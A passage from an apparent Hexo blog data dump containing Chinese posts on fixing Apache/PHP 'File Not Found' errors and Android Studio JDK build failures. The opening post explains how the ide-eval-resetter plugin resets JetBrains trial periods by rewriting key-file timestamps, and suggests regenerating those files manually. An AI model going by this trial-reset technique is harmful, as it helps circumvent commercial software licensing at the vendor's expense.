href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h3><p>从上述解决方法我们可以看出，无限重置时间之所以能生效，关键就在这些key文件。我大致了解了一下此插件源代码之后，可以得知key文件里面存储的信息：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// LicenseFileRecord.java</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">reset</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!FileUtil.delete(file)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Exception</span>(<span class=\"string\">&quot;Remove &quot;</span> + type + <span class=\"string\">&quot; failed: &quot;</span> + file.getAbsolutePath());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 此处写入了当前时间戳，貌似就是这么简单</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> (<span class=\"type\">DataOutputStream</span> <span class=\"variable\">dos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DataOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(file))) &#123;</span><br><span class=\"line\">        dos.writeLong(~System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因此，如果我们的所有key文件都超过30天过期了，就可以copy一下插件的源代码，自己去运行这些逻辑手动写入信息或生成key文件，具体操作就不赘述了。</p>\n<p>总之，此插件还是有它的局限性，大部分代码都是GUI相关的，<del>如果作者可以搞一个可执行脚本就好了</del>，这样可以在命令行中拯救那些过期后打不开的JB全家桶。</p>\n<p><strong>最新：</strong> 后来发现呢，实际上作者有提供这样一个<a href=\"https://gitee.com/pengzhile/ide-eval-resetter/tree/master/scripts\">临时脚本</a>，可以让打不开IDE的（Evaluate for free显示不可选）重新获取权限。</p>\n"},{"layout":"post","title":"Apache和PHP环境打开php页面File Not Found问题","subtitle":"一些无聊的小问题。","date":"2021-10-21T16:00:00.000Z","author":"YSY","header-img":"img/404-bg.jpg","catalog":true,"_content":"\n### 问题\n\n之前搞了个腾讯云的轻量应用服务器（预装环境LAMP）来玩，结果最近发现网站目录下面的php文件访问不了，在浏览器打开就出现“File Not Found”的提示。\n\n搜罗了很多答案，没有一个明确能解决问题的，不过还是得到了一些启示。下面属于我的个例，不一定能解决所有此类问题。\n\n### 解决\n\n腾讯云的这种服务器预装的软件都在此目录下面，包括相关配置：\n\n```bash\n[root@VM-0-15-centos ~]# cd /usr/local/lighthouse/softwares\n[root@VM-0-15-centos softwares]# ls\napache  mariadb  oniguruma  php\n```\n\n1、我们先配置一下apache，让你的网站首页可以以index.php的形式存在：\n\n```bash\n# 直接编辑配置文件\nvim apache/conf/httpd.conf\n```\n\n然后找到这段内容：\n\n```xml\n<IfModule dir_module>\n    DirectoryIndex index.html index.php\n</IfModule>\n```\n\n原本只有index.html，在后面补充即可，空格分隔。\n\n2、然后解决php文件“File Not Found”的问题，很多解答说有配置的关系，或者网站目录路径没设置对，或者SELinux安全问题等等，但最终都没得到解决。因为我这个环境是LAMP预装，各种配置肯定没有什么大差错。查看php-fpm进程也正常运行：\n\n```bash\n[root@VM-0-15-centos ~]# ps -ef | grep php\nroot      721409       1  0 15:31 ?        00:00:00 php-fpm: master process (/usr/local/lighthouse/softwares/php/etc/php-fpm.conf)\ndaemon    721410  721409  0 15:31 ?        00:00:00 php-fpm: pool www\ndaemon    721411  721409  0 15:31 ?        00:00:00 php-fpm: pool www\nroot      730570  727734  0 16:36 pts/1    00:00:00 grep --color=auto php\n```\n\n后来经过尝试，发现还是Apache服务配置的问题，同样地，还是修改刚才的 `httpd.conf` 文件，找到 **ProxyPassMatch** 这一行内容，我的在文件末尾：\n\n```bash\nProxyPassMatch ^/(.*\\.php(/.*)?)$ unix:/usr/local/lighthouse/softwares/apache/logs/php-fpm.sock|fcgi://127.0.0.1/home/www/htdocs/\n```\n\n直接注释掉或者删掉，然后保存文件。\n\n最后重启一下Apache服务：\n\n```bash\nservice apache restart\n```\n\n就这样解决了。\n\n","source":"_posts/2021-10-22-Apache和PHP环境打开php页面File Not Found问题.md","raw":"---\nlayout:     post\ntitle:      Apache和PHP环境打开php页面File Not Found问题\nsubtitle:   一些无聊的小问题。\ndate:       2021-10-22\nauthor:     YSY\nheader-img: img/404-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n    - 后端\n---\n\n### 问题\n\n之前搞了个腾讯云的轻量应用服务器（预装环境LAMP）来玩，结果最近发现网站目录下面的php文件访问不了，在浏览器打开就出现“File Not Found”的提示。\n\n搜罗了很多答案，没有一个明确能解决问题的，不过还是得到了一些启示。下面属于我的个例，不一定能解决所有此类问题。\n\n### 解决\n\n腾讯云的这种服务器预装的软件都在此目录下面，包括相关配置：\n\n```bash\n[root@VM-0-15-centos ~]# cd /usr/local/lighthouse/softwares\n[root@VM-0-15-centos softwares]# ls\napache  mariadb  oniguruma  php\n```\n\n1、我们先配置一下apache，让你的网站首页可以以index.php的形式存在：\n\n```bash\n# 直接编辑配置文件\nvim apache/conf/httpd.conf\n```\n\n然后找到这段内容：\n\n```xml\n<IfModule dir_module>\n    DirectoryIndex index.html index.php\n</IfModule>\n```\n\n原本只有index.html，在后面补充即可，空格分隔。\n\n2、然后解决php文件“File Not Found”的问题，很多解答说有配置的关系，或者网站目录路径没设置对，或者SELinux安全问题等等，但最终都没得到解决。因为我这个环境是LAMP预装，各种配置肯定没有什么大差错。查看php-fpm进程也正常运行：\n\n```bash\n[root@VM-0-15-centos ~]# ps -ef | grep php\nroot      721409       1  0 15:31 ?        00:00:00 php-fpm: master process (/usr/local/lighthouse/softwares/php/etc/php-fpm.conf)\ndaemon    721410  721409  0 15:31 ?        00:00:00 php-fpm: pool www\ndaemon    721411  721409  0 15:31 ?        00:00:00 php-fpm: pool www\nroot      730570  727734  0 16:36 pts/1    00:00:00 grep --color=auto php\n```\n\n后来经过尝试，发现还是Apache服务配置的问题，同样地，还是修改刚才的 `httpd.conf` 文件，找到 **ProxyPassMatch** 这一行内容，我的在文件末尾：\n\n```bash\nProxyPassMatch ^/(.*\\.php(/.*)?)$ unix:/usr/local/lighthouse/softwares/apache/logs/php-fpm.sock|fcgi://127.0.0.1/home/www/htdocs/\n```\n\n直接注释掉或者删掉，然后保存文件。\n\n最后重启一下Apache服务：\n\n```bash\nservice apache restart\n```\n\n就这样解决了。\n\n","slug":"Apache和PHP环境打开php页面File Not Found问题","published":1,"updated":"2024-03-25T07:31:25.986Z","comments":1,"photos":[],"link":"","_id":"cluaufh1h004cthe61doz57gs","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>之前搞了个腾讯云的轻量应用服务器（预装环境LAMP）来玩，结果最近发现网站目录下面的php文件访问不了，在浏览器打开就出现“File Not Found”的提示。</p>\n<p>搜罗了很多答案，没有一个明确能解决问题的，不过还是得到了一些启示。下面属于我的个例，不一定能解决所有此类问题。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>腾讯云的这种服务器预装的软件都在此目录下面，包括相关配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-0-15-centos ~]<span class=\"comment\"># cd /usr/local/lighthouse/softwares</span></span><br><span class=\"line\">[root@VM-0-15-centos softwares]<span class=\"comment\"># ls</span></span><br><span class=\"line\">apache  mariadb  oniguruma  php</span><br></pre></td></tr></table></figure>\n\n<p>1、我们先配置一下apache，让你的网站首页可以以index.php的形式存在：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 直接编辑配置文件</span></span><br><span class=\"line\">vim apache/conf/httpd.conf</span><br></pre></td></tr></table></figure>\n\n<p>然后找到这段内容：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">IfModule</span> <span class=\"attr\">dir_module</span>&gt;</span></span><br><span class=\"line\">    DirectoryIndex index.html index.php</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>原本只有index.html，在后面补充即可，空格分隔。</p>\n<p>2、然后解决php文件“File Not Found”的问题，很多解答说有配置的关系，或者网站目录路径没设置对，或者SELinux安全问题等等，但最终都没得到解决。因为我这个环境是LAMP预装，各种配置肯定没有什么大差错。查看php-fpm进程也正常运行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-0-15-centos ~]<span class=\"comment\"># ps -ef | grep php</span></span><br><span class=\"line\">root      721409       1  0 15:31 ?        00:00:00 php-fpm: master process (/usr/local/lighthouse/softwares/php/etc/php-fpm.conf)</span><br><span class=\"line\">daemon    721410  721409  0 15:31 ?        00:00:00 php-fpm: pool www</span><br><span class=\"line\">daemon    721411  721409  0 15:31 ?        00:00:00 php-fpm: pool www</span><br><span class=\"line\">root      730570  727734  0 16:36 pts/1    00:00:00 grep --color=auto php</span><br></pre></td></tr></table></figure>\n\n<p>后来经过尝试，发现还是Apache服务配置的问题，同样地，还是修改刚才的 <code>httpd.conf</code> 文件，找到 <strong>ProxyPassMatch</strong> 这一行内容，我的在文件末尾：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ProxyPassMatch ^/(.*\\.php(/.*)?)$ unix:/usr/local/lighthouse/softwares/apache/logs/php-fpm.sock|fcgi://127.0.0.1/home/www/htdocs/</span><br></pre></td></tr></table></figure>\n\n<p>直接注释掉或者删掉，然后保存文件。</p>\n<p>最后重启一下Apache服务：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service apache restart</span><br></pre></td></tr></table></figure>\n\n<p>就这样解决了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>之前搞了个腾讯云的轻量应用服务器（预装环境LAMP）来玩，结果最近发现网站目录下面的php文件访问不了，在浏览器打开就出现“File Not Found”的提示。</p>\n<p>搜罗了很多答案，没有一个明确能解决问题的，不过还是得到了一些启示。下面属于我的个例，不一定能解决所有此类问题。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>腾讯云的这种服务器预装的软件都在此目录下面，包括相关配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-0-15-centos ~]<span class=\"comment\"># cd /usr/local/lighthouse/softwares</span></span><br><span class=\"line\">[root@VM-0-15-centos softwares]<span class=\"comment\"># ls</span></span><br><span class=\"line\">apache  mariadb  oniguruma  php</span><br></pre></td></tr></table></figure>\n\n<p>1、我们先配置一下apache，让你的网站首页可以以index.php的形式存在：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 直接编辑配置文件</span></span><br><span class=\"line\">vim apache/conf/httpd.conf</span><br></pre></td></tr></table></figure>\n\n<p>然后找到这段内容：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">IfModule</span> <span class=\"attr\">dir_module</span>&gt;</span></span><br><span class=\"line\">    DirectoryIndex index.html index.php</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>原本只有index.html，在后面补充即可，空格分隔。</p>\n<p>2、然后解决php文件“File Not Found”的问题，很多解答说有配置的关系，或者网站目录路径没设置对，或者SELinux安全问题等等，但最终都没得到解决。因为我这个环境是LAMP预装，各种配置肯定没有什么大差错。查看php-fpm进程也正常运行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-0-15-centos ~]<span class=\"comment\"># ps -ef | grep php</span></span><br><span class=\"line\">root      721409       1  0 15:31 ?        00:00:00 php-fpm: master process (/usr/local/lighthouse/softwares/php/etc/php-fpm.conf)</span><br><span class=\"line\">daemon    721410  721409  0 15:31 ?        00:00:00 php-fpm: pool www</span><br><span class=\"line\">daemon    721411  721409  0 15:31 ?        00:00:00 php-fpm: pool www</span><br><span class=\"line\">root      730570  727734  0 16:36 pts/1    00:00:00 grep --color=auto php</span><br></pre></td></tr></table></figure>\n\n<p>后来经过尝试，发现还是Apache服务配置的问题，同样地，还是修改刚才的 <code>httpd.conf</code> 文件，找到 <strong>ProxyPassMatch</strong> 这一行内容，我的在文件末尾：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ProxyPassMatch ^/(.*\\.php(/.*)?)$ unix:/usr/local/lighthouse/softwares/apache/logs/php-fpm.sock|fcgi://127.0.0.1/home/www/htdocs/</span><br></pre></td></tr></table></figure>\n\n<p>直接注释掉或者删掉，然后保存文件。</p>\n<p>最后重启一下Apache服务：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service apache restart</span><br></pre></td></tr></table></figure>\n\n<p>就这样解决了。</p>\n"},{"layout":"post","title":"解决Android Studio升级到Arctic Fox后编译失败的问题","subtitle":"我都不知道为什么我能解决。","date":"2021-12-20T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 问题\n\n从Android Studio 4.1.3升级到最新的Arctic Fox之后，整个组件化工程会编译不过。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/0f42f86e474e42b582277a3f314f1a1a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n编译错误显示：\n\n> **e: [kapt] 'com.sun.tools.javac.util.Context' class can't be found ('tools.jar' is absent in the plugin classpath). Kapt won't work.**\n\n很多同学知难而退，被迫回滚到4.1.3，那怎么行呢？\n\n### 分析\n\n首先说，这个错误不是组件化插件的问题，不是Kotlin的问题，也不是工程本身的代码问题，而是JDK没配置好导致的。\n\n但是有人会问了，为什么旧版Studio用得好好的，升级到新版就有JDK的问题了？因为新版Studio默认内置了JDK 11，Gradle会使用11来运行，放弃了JDK 8（细心的同学已经发现，启动界面的Runtime version已经变成了11，不再是8了）。\n\n如果不做任何设置，默认用JDK 11来编译工程，就会失败，当然错误提示不会是上面那个，是另一个，这里不赘述，我们还是以JDK 8来编译。\n\n### 解决\n\n1、我们先打开Studio的偏好设置（Preferences），然后**修改Gradle JDK为1.8**。\n\n一般来说它会检测你系统安装的JDK，如果没有，你就手动Add一下，Add到Home那一层，图中我的路径都是JDK的默认安装路径（我的JDK当初都是用brew直接install的openjdk）。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/92366ae7745842daad7b841fc269f15c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n2、设置好之后，还要记得**配置你的终端环境变量**，这个是为了保证整个系统环境（包括脚本命令执行）都使用JDK 8，否则版本不一致也会出问题。\n\n如果是bash就修改.bashrc，我是用的zsh，所以编辑.zshrc：\n\n```bash\nvim ~/.zshrc\n```\n\n追加内容：\n\n```bash\nexport CLASSPATH=/Library/Java/JavaVirtualMachines/openjdk-8.jdk/Contents/Home/lib\nexport JAVA_HOME=/Library/Java/JavaVirtualMachines/openjdk-8.jdk/Contents/Home\n```\n\n保存并退出。\n\n3、**重启Studio，尝试Rebuild工程**，如果没有问题，那恭喜你，不用继续往下看了。\n\n当然，绝大多数情况，就会出现本文最开始那个错误提示：找不到tools.jar。我们知道，这个jar包是JDK lib目录下面的：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/7ed58e8b016847d38c5a43f8c6dd5d01.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n既然环境变量也配置了，怎么就提示错误呢？\n\n4、后来在网上搜了一下，发现是默认JDK的目录命名符号有问题，其实上面看到的 **/Library/Java/JavaVirtualMachines/openjdk-8.jdk** 是个软链接，指向的真实路径是：\n\n**/usr/local/Cellar/openjdk@8/1.8.0+282/libexec/openjdk.jdk**\n\n注意到里面的+号没有，这个玩意儿就是祸首。接下来我们修正错误：\n\n```bash\ncd /usr/local/Cellar/openjdk@8/\n# 把+改成_\nmv 1.8.0+282 1.8.0_282\n# 去修正软链接，如果提示已存在就先sudo rm删掉\nsudo ln -s /usr/local/Cellar/openjdk@8/1.8.0_282/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-8.jdk\n```\n\n此时再重新做一次上述第1步，设置JDK为1.8，再次Rebuild编译（建议先File → Invalidate Caches一下），成功。\n\n### 总结\n\n其实主要原因还是JDK配置的问题，可能新版Studio的Gradle在处理路径或者符号链接上面做了什么奇葩改动。\n\n理论上讲，如果你的JDK本身就配置得非常完美，那么只需要做好第1步，就不会有其他问题了。\n\n升级后部分UI中文变方块，解决办法是修改一下字体即可（Preferences → Appearance → Use custom font）。\n","source":"_posts/2021-12-21-解决Android Studio升级到Arctic Fox后编译失败的问题.md","raw":"---\nlayout:     post\ntitle:      解决Android Studio升级到Arctic Fox后编译失败的问题\nsubtitle:   我都不知道为什么我能解决。\ndate:       2021-12-21\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n    - Android\n---\n\n### 问题\n\n从Android Studio 4.1.3升级到最新的Arctic Fox之后，整个组件化工程会编译不过。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/0f42f86e474e42b582277a3f314f1a1a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n编译错误显示：\n\n> **e: [kapt] 'com.sun.tools.javac.util.Context' class can't be found ('tools.jar' is absent in the plugin classpath). Kapt won't work.**\n\n很多同学知难而退，被迫回滚到4.1.3，那怎么行呢？\n\n### 分析\n\n首先说，这个错误不是组件化插件的问题，不是Kotlin的问题，也不是工程本身的代码问题，而是JDK没配置好导致的。\n\n但是有人会问了，为什么旧版Studio用得好好的，升级到新版就有JDK的问题了？因为新版Studio默认内置了JDK 11，Gradle会使用11来运行，放弃了JDK 8（细心的同学已经发现，启动界面的Runtime version已经变成了11，不再是8了）。\n\n如果不做任何设置，默认用JDK 11来编译工程，就会失败，当然错误提示不会是上面那个，是另一个，这里不赘述，我们还是以JDK 8来编译。\n\n### 解决\n\n1、我们先打开Studio的偏好设置（Preferences），然后**修改Gradle JDK为1.8**。\n\n一般来说它会检测你系统安装的JDK，如果没有，你就手动Add一下，Add到Home那一层，图中我的路径都是JDK的默认安装路径（我的JDK当初都是用brew直接install的openjdk）。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/92366ae7745842daad7b841fc269f15c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n2、设置好之后，还要记得**配置你的终端环境变量**，这个是为了保证整个系统环境（包括脚本命令执行）都使用JDK 8，否则版本不一致也会出问题。\n\n如果是bash就修改.bashrc，我是用的zsh，所以编辑.zshrc：\n\n```bash\nvim ~/.zshrc\n```\n\n追加内容：\n\n```bash\nexport CLASSPATH=/Library/Java/JavaVirtualMachines/openjdk-8.jdk/Contents/Home/lib\nexport JAVA_HOME=/Library/Java/JavaVirtualMachines/openjdk-8.jdk/Contents/Home\n```\n\n保存并退出。\n\n3、**重启Studio，尝试Rebuild工程**，如果没有问题，那恭喜你，不用继续往下看了。\n\n当然，绝大多数情况，就会出现本文最开始那个错误提示：找不到tools.jar。我们知道，这个jar包是JDK lib目录下面的：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/7ed58e8b016847d38c5a43f8c6dd5d01.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)\n既然环境变量也配置了，怎么就提示错误呢？\n\n4、后来在网上搜了一下，发现是默认JDK的目录命名符号有问题，其实上面看到的 **/Library/Java/JavaVirtualMachines/openjdk-8.jdk** 是个软链接，指向的真实路径是：\n\n**/usr/local/Cellar/openjdk@8/1.8.0+282/libexec/openjdk.jdk**\n\n注意到里面的+号没有，这个玩意儿就是祸首。接下来我们修正错误：\n\n```bash\ncd /usr/local/Cellar/openjdk@8/\n# 把+改成_\nmv 1.8.0+282 1.8.0_282\n# 去修正软链接，如果提示已存在就先sudo rm删掉\nsudo ln -s /usr/local/Cellar/openjdk@8/1.8.0_282/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-8.jdk\n```\n\n此时再重新做一次上述第1步，设置JDK为1.8，再次Rebuild编译（建议先File → Invalidate Caches一下），成功。\n\n### 总结\n\n其实主要原因还是JDK配置的问题，可能新版Studio的Gradle在处理路径或者符号链接上面做了什么奇葩改动。\n\n理论上讲，如果你的JDK本身就配置得非常完美，那么只需要做好第1步，就不会有其他问题了。\n\n升级后部分UI中文变方块，解决办法是修改一下字体即可（Preferences → Appearance → Use custom font）。\n","slug":"解决Android Studio升级到Arctic Fox后编译失败的问题","published":1,"updated":"2024-03-25T07:31:25.986Z","comments":1,"photos":[],"link":"","_id":"cluaufh1h004ethe68od40hrf","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>从Android Studio 4.1.3升级到最新的Arctic Fox之后，整个组件化工程会编译不过。<br><img src=\"https://imgconvert.csdnimg.cn/0f42f86e474e42b582277a3f314f1a1a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br>编译错误显示：</p>\n<blockquote>\n<p><strong>e: [kapt] ‘com.sun.tools.javac.util.Context’ class can’t be found (‘tools.jar’ is absent in the plugin classpath). Kapt won’t work.</strong></p>\n</blockquote>\n<p>很多同学知难而退，被迫回滚到4.1.3，那怎么行呢？</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先说，这个错误不是组件化插件的问题，不是Kotlin的问题，也不是工程本身的代码问题，而是JDK没配置好导致的。</p>\n<p>但是有人会问了，为什么旧版Studio用得好好的，升级到新版就有JDK的问题了？因为新版Studio默认内置了JDK 11，Gradle会使用11来运行，放弃了JDK 8（细心的同学已经发现，启动界面的Runtime version已经变成了11，不再是8了）。</p>\n<p>如果不做任何设置，默认用JDK 11来编译工程，就会失败，当然错误提示不会是上面那个，是另一个，这里不赘述，我们还是以JDK 8来编译。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>1、我们先打开Studio的偏好设置（Preferences），然后<strong>修改Gradle JDK为1.8</strong>。</p>\n<p>一般来说它会检测你系统安装的JDK，如果没有，你就手动Add一下，Add到Home那一层，图中我的路径都是JDK的默认安装路径（我的JDK当初都是用brew直接install的openjdk）。<br><img src=\"https://imgconvert.csdnimg.cn/92366ae7745842daad7b841fc269f15c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br>2、设置好之后，还要记得<strong>配置你的终端环境变量</strong>，这个是为了保证整个系统环境（包括脚本命令执行）都使用JDK 8，否则版本不一致也会出问题。</p>\n<p>如果是bash就修改.bashrc，我是用的zsh，所以编辑.zshrc：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>追加内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> CLASSPATH=/Library/Java/JavaVirtualMachines/openjdk-8.jdk/Contents/Home/lib</span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME=/Library/Java/JavaVirtualMachines/openjdk-8.jdk/Contents/Home</span><br></pre></td></tr></table></figure>\n\n<p>保存并退出。</p>\n<p>3、<strong>重启Studio，尝试Rebuild工程</strong>，如果没有问题，那恭喜你，不用继续往下看了。</p>\n<p>当然，绝大多数情况，就会出现本文最开始那个错误提示：找不到tools.jar。我们知道，这个jar包是JDK lib目录下面的：<br><img src=\"https://imgconvert.csdnimg.cn/7ed58e8b016847d38c5a43f8c6dd5d01.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br>既然环境变量也配置了，怎么就提示错误呢？</p>\n<p>4、后来在网上搜了一下，发现是默认JDK的目录命名符号有问题，其实上面看到的 <strong>&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;openjdk-8.jdk</strong> 是个软链接，指向的真实路径是：</p>\n<p><strong>&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;openjdk@8&#x2F;1.8.0+282&#x2F;libexec&#x2F;openjdk.jdk</strong></p>\n<p>注意到里面的+号没有，这个玩意儿就是祸首。接下来我们修正错误：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/local/Cellar/openjdk@8/</span><br><span class=\"line\"><span class=\"comment\"># 把+改成_</span></span><br><span class=\"line\"><span class=\"built_in\">mv</span> 1.8.0+282 1.8.0_282</span><br><span class=\"line\"><span class=\"comment\"># 去修正软链接，如果提示已存在就先sudo rm删掉</span></span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/local/Cellar/openjdk@8/1.8.0_282/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-8.jdk</span><br></pre></td></tr></table></figure>\n\n<p>此时再重新做一次上述第1步，设置JDK为1.8，再次Rebuild编译（建议先File → Invalidate Caches一下），成功。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>其实主要原因还是JDK配置的问题，可能新版Studio的Gradle在处理路径或者符号链接上面做了什么奇葩改动。</p>\n<p>理论上讲，如果你的JDK本身就配置得非常完美，那么只需要做好第1步，就不会有其他问题了。</p>\n<p>升级后部分UI中文变方块，解决办法是修改一下字体即可（Preferences → Appearance → Use custom font）。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p 